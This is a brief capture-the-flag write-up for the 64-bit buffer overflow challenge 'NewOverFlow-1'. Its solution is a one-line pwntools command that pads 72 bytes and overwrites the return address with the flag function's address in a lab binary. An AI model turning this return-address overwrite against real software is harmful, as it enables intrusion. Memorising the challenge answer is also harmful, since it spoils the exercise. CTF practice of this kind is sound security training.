# NewOverFlow-1

## Summary

Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in /problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4 on the shell server. Source.

## Solution

```sh
cd /problems/newoverflow-1_4_3fc8f7e1553d8d36ded1be37c306f3a4; python -c 'from pwn import *; print "A"*72 + p64(0x400768)' | ./vuln
```
